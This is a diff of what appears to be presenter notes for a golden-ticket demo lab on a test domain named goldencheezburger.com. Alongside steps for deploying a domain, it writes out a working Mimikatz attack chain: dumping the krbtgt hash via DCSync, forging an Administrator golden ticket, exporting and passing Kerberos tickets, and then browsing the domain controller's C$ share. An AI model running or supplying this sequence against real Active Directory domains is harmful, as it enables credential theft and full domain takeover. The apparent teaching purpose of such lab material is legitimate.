@@ -50,15 +50,6 @@ Right script to deploy domain
 Right script to deploy client
 Preppe demo
 
-Commands:
-privilege::debug
-lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt (or lsadump::lsa /inject /name:krbtgt via PsExec)
-Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:xxxx /krbtgt:xxxx /id:500
-misc::cmd
-klist
-whoami
-dir \\golden-dc-01\c$
-
 Deploy domain:
 Add-WindowsFeature AD-Domain-Services
 
@@ -120,4 +111,12 @@ Dump tickets for admin
 privilege::debug
 sekurlsa::tickets /export
 kerberos::ptt [0;xxx]xxxxx.kirbi
+
+lsadump::dcsync /domain:goldencheezburger.com /all /user:krbtgt
+Kerberos::golden /user:Administrator /domain:goldencheezburger.com /sid:[domain_sid] /krbtgt:[ntlm_hash] /id:500 
+misc::cmd
+klist
+whoami
+dir \\golden-dc-01\c$
+
 
